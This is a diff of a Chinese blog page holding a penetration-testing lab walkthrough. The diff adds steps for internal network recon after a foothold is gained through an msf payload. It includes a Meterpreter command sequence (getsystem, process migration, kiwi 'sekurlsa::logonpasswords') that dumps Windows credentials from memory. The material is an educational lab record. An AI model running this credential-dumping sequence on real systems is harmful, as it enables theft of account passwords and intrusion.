@@ -37,11 +37,12 @@
 <meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240115222152209.png">
 <meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240115223009387.png">
 <meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240115223058319.png">
-<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240115223138024.png">
-<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240115224226664.png">
-<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240115224410926.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Struts2/image-20240116213149341.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Struts2/image-20240116213348911.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Struts2/image-20240116213415088.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Struts2/image-20240116220321187.png">
 <meta property="article:published_time" content="2024-01-15T12:31:45.000Z">
-<meta property="article:modified_time" content="2024-01-15T14:44:21.520Z">
+<meta property="article:modified_time" content="2024-01-16T14:04:49.239Z">
 <meta property="article:author" content="August Rosenberg">
 <meta property="article:tag" content="靶场记录">
 <meta name="twitter:card" content="summary_large_image">
@@ -245,7 +246,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          448 words
+          598 words
         
       </span>
     
@@ -256,7 +257,7 @@
         
         
         
-          4 mins
+          5 mins
         
       </span>
     
@@ -344,19 +345,36 @@
 <p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240115222152209.png" srcset="/img/loading.gif" lazyload alt="image-20240115222152209"></p>
 </li>
 </ol>
-<h1 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h1><ol>
+<h1 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h1><p>上传paylaod，使用msf连接</p>
+<ol>
 <li><p>查看内网网段</p>
 <p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240115223009387.png" srcset="/img/loading.gif" lazyload alt="image-20240115223009387"></p>
 <p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240115223058319.png" srcset="/img/loading.gif" lazyload alt="image-20240115223058319"></p>
 </li>
-<li><p>发现存在namp，就不用自己上传工具了<br><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240115223138024.png" srcset="/img/loading.gif" lazyload alt="image-20240115223138024"></p>
-<p>探测一下主机哪些是存活的</p>
-<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240115224226664.png" srcset="/img/loading.gif" lazyload alt="image-20240115224226664"></p>
-<p>注意有一些参数是新版才有，所以这里不用sn参数</p>
+<li><p>收集存活主机</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Struts2/image-20240116213149341.png" srcset="/img/loading.gif" lazyload alt="image-20240116213149341"></p>
 </li>
-<li><p>192.168.79.138</p>
-<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240115224410926.png" srcset="/img/loading.gif" lazyload alt="image-20240115224410926"></p>
-<p>有一个ssh</p>
+<li><p>获取每一主机的端口信息</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Struts2/image-20240116213348911.png" srcset="/img/loading.gif" lazyload alt="image-20240116213348911"></p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Struts2/image-20240116213415088.png" srcset="/img/loading.gif" lazyload alt="image-20240116213415088"></p>
+<p>还有一个主机就不扫了</p>
+</li>
+<li><p>接着对跳板机做信息收集</p>
+<ul>
+<li><p>操作系统版本</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">systeminfo /fo  list  <br></code></pre></td></tr></table></figure>
+
+
+</li>
+<li><p>获取密码</p>
+<p>在这里发现发现x86的payload跑不了x64程序，所以尝试使用进程迁移的方式转移到其他进程</p>
+<figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs nsis">getuid<br>get<span class="hljs-params">system</span><br>ps <span class="hljs-comment"># 查找可以用于迁移的进程</span><br>migrate pid<br>kiwi_cmd <span class="hljs-title function_">sekurlsa::logonpasswords</span> <br>rev2self<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Struts2/image-20240116220321187.png" srcset="/img/loading.gif" lazyload alt="image-20240116220321187"></p>
+</li>
+<li><p>查看是否存在域环境</p>
+</li>
+</ul>
 </li>
 </ol>
 
